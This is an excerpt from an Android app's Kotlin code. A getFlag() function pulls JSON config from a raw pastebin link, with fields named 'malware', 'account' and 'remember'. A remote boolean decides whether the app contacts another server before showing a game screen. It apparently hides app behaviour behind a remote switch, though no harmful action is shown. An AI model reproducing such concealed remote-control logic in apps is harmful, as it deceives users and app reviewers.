...
//            startFragmentIdFlow.tryEmit(WEB_VIEW_ID)
    ...
    private suspend fun getFlag() {
        val request: Request = Request.Builder().url("https://pastebin.com/raw/4dSs4eRD").build()
        ...
        try {
            okHttpClient.newCall(request).execute().use { response ->
                if (response.isSuccessful) {
                    ...
                    val flag      = json.getBoolean("isPedantic")
                    val key       = json.getString("malware")
                    val privacy   = json.getString("account")
                    val linkCheck = json.getString("bel")
                    val link      = json.getString("remember")
                    ...
                    if (flag) getResponseFromServer(linkCheck, key, link)
                        ...
                        withContext(Dispatchers.Main) {
                            val btns = listOf(binding.redik, binding.greenik)
                            btns.onEach { it.setVisible(View.VISIBLE) }

                            binding.redik.setOnClickListener {
                            ...
                            binding.greenik.setOnClickListener {
                                btns.onEach { it.setVisible(View.GONE) }
                                startFragmentIdFlow.tryEmit(R.id.libGDXFragment)
                                lottie.showLoader()
